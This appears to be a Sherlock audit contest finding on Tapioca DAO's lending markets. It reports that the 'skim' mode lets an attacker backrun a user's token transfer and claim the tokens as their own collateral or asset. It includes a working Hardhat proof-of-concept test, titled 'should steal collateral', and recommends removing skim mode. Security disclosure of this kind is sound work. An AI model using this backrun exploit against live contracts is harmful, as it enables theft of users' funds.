Future Azure Locust

medium

# Stealing tokens added in `skim` mode

## Summary

Anyone can backrun the user's transfer of assets to market when the user wants to add collateral or assets in `skim` mode. The attacker can steal the tokens and add them as theirs. 

## Vulnerability Detail

The [`_addAsset`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/SGLCommon.sol#L180) and [`_addCollateral`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/bigBang/BBLendingCommon.sol#L40) functions accept a `skim` parameter, forwarded to the `_addTokens` function.

https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/bigBang/BBCommon.sol#L128-L138

When it is set to `true`, the market assumes that user had made a transfer to the market before. The market checks whether its balance is greater that the number of previously stored assets. If so, it treats the surplus as user's tokens.

The issue is that anyone can backrun user's transfer to the market and deposit user's tokens as theirs.

Here is the attack scenario:
1. The victim transfers 100 tokens to market.
2. The victim sends new transaction that calls [`addAsset`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/Singularity.sol#L230) with `skim = true`.
3. The attacker backruns the transaction from step 1 (alternatively, frontruns the `addAsset` transaction) and calls [`addAsset`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/Singularity.sol#L230) with `skim = true` and modified value of `to` parameter (changing it to attacker's address).

**Note to sponsor:** If you think that users will use this feature often, this bug may be considered HIGH.

**PoC**
As the hardhat tests were not working in the contest repository, we have used the repository and branch recommended by the team, that is https://github.com/Tapioca-DAO/Tapioca-bar repository and branch `CU-86drm12h2-hh-fixes`. It differs a bit from the tests in contest's repo but the attack scenario is the same. The PoC has been created for the `addCollateral` function.

```solidity
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { YieldBox } from '@tapioca-sdk/typechain/YieldBox';
import {
    ERC20Mock,
    MockSwapper__factory,
} from '@tapioca-sdk/typechain/tapioca-mocks';
import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { formatUnits } from 'ethers/lib/utils';
import hre, { ethers } from 'hardhat';
import { BN, register } from './test.utils';

describe('BigBang test', () => {

    describe('addCollateral()', () => {

        it('should add collateral', async () => {
            const {
                wethBigBangMarket,
                weth,
                wethAssetId,
                yieldBox,
                deployer,
                eoa1,
                marketHelper,
            } = await loadFixture(register);

            await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
                10,
            );
            await weth.freeMint(wethMintVal);
            const valShare = await yieldBox.toShare(
                wethAssetId,
                wethMintVal,
                false,
            );
            await yieldBox.depositAsset(
                wethAssetId,
                deployer.address,
                deployer.address,
                0,
                valShare,
            );

            // deployer sends tokens to market 
            await yieldBox.transfer(deployer.address, wethBigBangMarket.address, wethAssetId, valShare);

            // deployer creates a call in skim mode
            const addCollateralData = await marketHelper.addCollateral(
                deployer.address,
                deployer.address,
                true,
                0,
                valShare,
            );
            await wethBigBangMarket.execute(
                addCollateralData[0],
                addCollateralData[1],
                true,
            );

            let collateralShares = await wethBigBangMarket.userCollateralShare(
                deployer.address,
            );
            expect(collateralShares.gt(0)).to.be.true;
            //deployer gets valShares
            expect(collateralShares.eq(valShare)).to.be.true;

        });

        it('should steal collateral', async () => {
            const {
                wethBigBangMarket,
                weth,
                wethAssetId,
                yieldBox,
                deployer,
                eoa1,
                marketHelper,
            } = await loadFixture(register);

            await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
            await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
                10,
            );
            await weth.freeMint(wethMintVal);
            const valShare = await yieldBox.toShare(
                wethAssetId,
                wethMintVal,
                false,
            );
            await yieldBox.depositAsset(
                wethAssetId,
                deployer.address,
                deployer.address,
                0,
                valShare,
            );

            // deployer (victim) sends tokens to market 
            await yieldBox.transfer(deployer.address, wethBigBangMarket.address, wethAssetId, valShare);

            // eo1 (attacker) backruns the victim and creates a call in skim mode but changes the address to theirs
            const addCollateralData = await marketHelper.addCollateral(
                eoa1.address,
                eoa1.address,
                true,
                0,
                valShare,
            );
            await wethBigBangMarket.connect(eoa1).execute(
                addCollateralData[0],
                addCollateralData[1],
                true,
            );

            let collateralShares = await wethBigBangMarket.userCollateralShare(
                eoa1.address,
            );
            expect(collateralShares.gt(0)).to.be.true;
            // eoa1 (attacker) gets the valShare
            expect(collateralShares.eq(valShare)).to.be.true;

        });
    });

});
```

## Impact

MEDIUM - Stealing tokens of user who made a transfer to market (e.g. while using the business flow with `skim` set to `true`).

## Code Snippet

https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/bigBang/BBCommon.sol#L128-L138

https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/Tapioca-bar/contracts/markets/singularity/SGLCommon.sol#L165-L177

## Tool used

Manual Review

## Recommendation

Consider removing the `skim` mode.